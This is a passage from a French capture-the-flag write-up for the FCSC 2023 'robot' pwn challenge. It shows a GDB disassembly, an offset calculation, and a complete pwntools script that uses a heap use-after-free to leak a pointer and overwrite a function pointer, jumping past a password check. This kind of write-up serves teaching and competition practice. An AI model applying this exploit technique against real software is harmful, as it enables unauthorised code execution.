+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b14bd</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">230</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x55a4252b1040</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b14c2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">235</span><span style="color:#f92672">&gt;</span>:	nop
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b14c3</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">236</span><span style="color:#f92672">&gt;</span>:	mov    rax,QWORD PTR [rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x8</span>]
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b14c7</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">240</span><span style="color:#f92672">&gt;</span>:	sub    rax,QWORD PTR fs:<span style="color:#ae81ff">0x28</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b14d0</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">249</span><span style="color:#f92672">&gt;</span>:	je     <span style="color:#ae81ff">0x55a4252b14d7</span> <span style="color:#f92672">&lt;</span>admin<span style="color:#f92672">+</span><span style="color:#ae81ff">256</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b14d2</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">251</span><span style="color:#f92672">&gt;</span>:	call   <span style="color:#ae81ff">0x55a4252b1110</span> <span style="color:#f92672">&lt;</span>__stack_chk_fail<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b14d7</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">256</span><span style="color:#f92672">&gt;</span>:	leave  
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000055a4252b14d8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">257</span><span style="color:#f92672">&gt;</span>:	ret    
+</span></span><span style="display:flex;"><span>End of assembler dump<span style="color:#f92672">.</span>
+</span></span></code></pre></div><p>L&rsquo;instruction <code>jne</code> située à <code>+163</code> est une condition, probablement celle qui compare notre input avec le mot de passe, nous voulons donc arriver juste après cette condition, soit à <code>+165</code>. Pour calculer la différence entre les deux, il suffit de prendre l&rsquo;adresse de cette instruction et d&rsquo;y soustraire l&rsquo;adresse de <code>roll</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>print <span style="color:#ae81ff">0x000055a4252b147c</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x55a4252b12fc</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span><span style="color:#ae81ff">5</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">384</span>
+</span></span></code></pre></div><p>Une fois qu&rsquo;on a notre <em>leak</em>, il nous suffit donc d&rsquo;y ajouter <code>384</code> pour trouver l&rsquo;adresse de <code>admin+165</code>.</p>
+<p>Il ne nous reste plus qu&rsquo;à créer un manuel avec <strong>16</strong> chars, puis l&rsquo;adresse de <code>admin+165</code> pour réecrire <code>makeNoise</code> dans la <em>Struct</em> &ldquo;Robot&rdquo;</p>
+<h2 id="tldr">TLDR</h2>
+<ol>
+<li>Créer un robot (<em>malloc</em>)</li>
+<li>Jouer avec le robot (<em>free</em>)</li>
+<li>Créer un manuel (<em>malloc</em>)</li>
+<li>Lire le manuel (<em>UAF/leaks</em>)</li>
+<li>Calculer la différence entre <em>roll</em> et <code>admin+165</code></li>
+<li>Créer un robot (<em>malloc</em>)</li>
+<li>Jouer avec le robot (<em>free</em>)</li>
+<li>Créer un manuel de 16 caractères suivis de l&rsquo;adresse de <code>admin+165</code> (malloc/bleep overwrite)</li>
+<li>Faire parler le robot (<em>call <code>admin+165</code></em>)</li>
+</ol>
+<h2 id="exploit">Exploit</h2>
+<p>Et voici donc l&rsquo;exploit final:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> time <span style="color:#f92672">import</span> sleep
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./robot&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> exe
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">conn</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> process([exe<span style="color:#f92672">.</span>path])
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
+</span></span><span style="display:flex;"><span>            gdb<span style="color:#f92672">.</span>attach(r)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;challenges.france-cybersecurity-challenge.fr&#34;</span>, <span style="color:#ae81ff">2101</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">construire</span>(name):
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;construire(&#34;</span><span style="color:#f92672">+</span>str(name)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;)&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(name)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">parler</span>():
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;parler()&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">supprimer</span>():
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;supprimer()&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">mode_emploi</span>(text):
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;mode_emploi(&#34;</span><span style="color:#f92672">+</span>str(text)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;)&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;4&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(text)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>recv()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">manuel</span>():
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#39;manuel()&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;5&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r<span style="color:#f92672">.</span>recv()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> r
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> conn()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># robot = malloc()</span>
+</span></span><span style="display:flex;"><span>    construire(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># free(robot)</span>
+</span></span><span style="display:flex;"><span>    supprimer()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># manuel = malloc()</span>
+</span></span><span style="display:flex;"><span>    mode_emploi(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># manuel-&gt;guide</span>
+</span></span><span style="display:flex;"><span>    leak <span style="color:#f92672">=</span> manuel()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    roll <span style="color:#f92672">=</span> u64(leak[leak<span style="color:#f92672">.</span>index(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xfc</span><span style="color:#e6db74">&#39;</span>):]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;roll @&#34;</span>, hex(roll))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    flag <span style="color:#f92672">=</span> roll <span style="color:#f92672">+</span> <span style="color:#ae81ff">384</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;flag @&#34;</span>, hex(flag))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># robot = malloc()</span>
+</span></span><span style="display:flex;"><span>    construire(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># free(robot)</span>
+</span></span><span style="display:flex;"><span>    supprimer()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># manuel = malloc()</span>
+</span></span><span style="display:flex;"><span>    mode_emploi(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span> <span style="color:#f92672">+</span> p64(flag))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># robot-&gt;makeNoise</span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Flag:&#34;</span>, parler()<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#r.interactive()</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main()
+</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
+<p>Pour un premier challenge de <em>heap</em> de ma vie, j&rsquo;ai appris énormément de choses, c&rsquo;était super intéressant !</p>
+<p>Si j&rsquo;ai fait des erreurs n&rsquo;hésitez pas à me contacter sur discord (disponible sur la page <strong>About</strong>)</p>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="/tags/pwn/">pwn</a></span>
+        <span class="tag"><a href="/tags/heap/">heap</a></span>
+        <span class="tag"><a href="/tags/gdb/">gdb</a></span>
+        
+    </p>
+
+      
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        2197 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2023-30-04 02:00
+        
+
+         
+          
+        
+      </p>
+    </div>
+      <hr />
+      <div class="sharing-buttons">
+        
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=%2fposts%2f2023%2f04%2ffcsc-2023-pwn%2frobot%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=%2fposts%2f2023%2f04%2ffcsc-2023-pwn%2frobot%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=%f0%9f%87%ab%f0%9f%87%b7%20FCSC%202023%20-%20pwn%2frobot&amp;caption=%f0%9f%87%ab%f0%9f%87%b7%20FCSC%202023%20-%20pwn%2frobot&amp;canonicalUrl=%2fposts%2f2023%2f04%2ffcsc-2023-pwn%2frobot%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="mailto:?subject=%f0%9f%87%ab%f0%9f%87%b7%20FCSC%202023%20-%20pwn%2frobot&amp;body=%2fposts%2f2023%2f04%2ffcsc-2023-pwn%2frobot%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=%2fposts%2f2023%2f04%2ffcsc-2023-pwn%2frobot%2f&amp;media=%2fposts%2f2023%2f04%2ffcsc-2023-pwn%2frobot%2f;description=%f0%9f%87%ab%f0%9f%87%b7%20FCSC%202023%20-%20pwn%2frobot" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=%2fposts%2f2023%2f04%2ffcsc-2023-pwn%2frobot%2f&amp;title=%f0%9f%87%ab%f0%9f%87%b7%20FCSC%202023%20-%20pwn%2frobot&amp;summary=%f0%9f%87%ab%f0%9f%87%b7%20FCSC%202023%20-%20pwn%2frobot&amp;source=%2fposts%2f2023%2f04%2ffcsc-2023-pwn%2frobot%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=%2fposts%2f2023%2f04%2ffcsc-2023-pwn%2frobot%2f&amp;resubmit=true&amp;title=%f0%9f%87%ab%f0%9f%87%b7%20FCSC%202023%20-%20pwn%2frobot" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=%2fposts%2f2023%2f04%2ffcsc-2023-pwn%2frobot%2f;title=%f0%9f%87%ab%f0%9f%87%b7%20FCSC%202023%20-%20pwn%2frobot" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="whatsapp://send?text=%f0%9f%87%ab%f0%9f%87%b7%20FCSC%202023%20-%20pwn%2frobot%20%2fposts%2f2023%2f04%2ffcsc-2023-pwn%2frobot%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=%2fposts%2f2023%2f04%2ffcsc-2023-pwn%2frobot%2f&amp;t=%f0%9f%87%ab%f0%9f%87%b7%20FCSC%202023%20-%20pwn%2frobot" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=%f0%9f%87%ab%f0%9f%87%b7%20FCSC%202023%20-%20pwn%2frobot&amp;url=%2fposts%2f2023%2f04%2ffcsc-2023-pwn%2frobot%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
